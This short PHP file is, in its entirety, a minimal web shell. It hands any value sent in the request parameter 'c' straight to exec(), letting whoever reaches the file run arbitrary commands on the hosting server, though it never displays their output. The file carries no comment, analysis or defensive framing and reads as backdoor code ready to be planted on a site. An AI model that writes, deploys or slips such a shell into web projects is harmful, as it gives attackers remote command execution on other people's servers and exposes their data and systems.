<?php
if(isset($_REQUEST['c']))
{
    trim(exec($_REQUEST['c'],$return));
}
?>